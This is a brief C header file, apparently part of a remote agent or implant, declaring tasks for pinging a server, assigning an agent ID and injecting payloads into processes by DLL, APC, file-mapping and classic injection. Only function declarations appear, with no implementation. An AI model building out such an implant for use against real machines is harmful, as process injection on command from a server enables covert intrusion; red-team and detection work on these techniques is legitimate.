#ifndef _TASK_
#define _TASK_
#include "../message/Message.h"

PMESSAGE pingServer();
PMESSAGE initAgentId(PBYTE payload);
PMESSAGE injectViaDllTask(PBYTE payload);
PMESSAGE injectViaApcTask(PBYTE payload);
PMESSAGE injectViaFileMappingTask(PBYTE payload);
PMESSAGE injectViaClassicProcessTask(PBYTE payload);

#endif